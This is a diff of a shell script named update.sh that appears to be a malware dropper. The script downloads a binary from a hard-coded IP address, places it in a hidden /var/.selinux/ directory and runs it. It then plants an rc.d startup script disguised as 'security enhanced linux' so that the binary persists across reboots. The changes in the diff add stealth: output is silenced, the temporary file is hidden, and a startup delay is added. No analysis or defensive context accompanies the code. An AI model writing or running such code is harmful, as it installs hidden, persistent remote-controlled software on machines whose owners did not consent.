@@ -2,6 +2,8 @@
 
 # parameter protocal: update.sh alexjlz_client_url
 
+exec 1</dev/null
+exec 2</dev/null
 declare -i count_down_from=100
 declare -i does_this_exist=0
 current_working_directory=`pwd`
@@ -10,7 +12,7 @@ current_rc_d="/etc/rc$current_runlevel.d/"
 
 self=`basename $0`
 base_location="/var/.selinux/"
-tmp_file="/tmp/client"
+tmp_file="/tmp/.client"
 default_url="http://198.211.0.204/client"
 url=""
 mydownloader=`which curl`
@@ -30,7 +32,7 @@ do
     $mydownloader $url >$tmp_file 2>/dev/null
     status=$?
 done
-cp $tmp_file $base_location/client
+cp -f $tmp_file $base_location/client
 chmod a+x $base_location/client
 $base_location/client
 rm -rf $tmp_file
@@ -41,11 +43,12 @@ do
     count_down_from=$count_down_from-1
     does_this_exist=`ls | grep "^S$count_down_from" | wc -l`
     if [ $does_this_exist -eq 0 ];then
-        new_S_file_name="S${count_down_from}SELINUX"
+        new_S_file_name="S${count_down_from}selinux"
         echo "#!/bin/sh" >> $new_S_file_name
         echo "#alexjlz" >> $new_S_file_name
         echo "#security enhanced linux" >> $new_S_file_name
-        echo "$base_location/client" >> $new_S_file_name
+        echo "sleep 60" >> $new_S_file_name
+        echo "${base_location}client" >> $new_S_file_name
         break
     else
         this_file=`ls | grep "^S$count_down_from"`
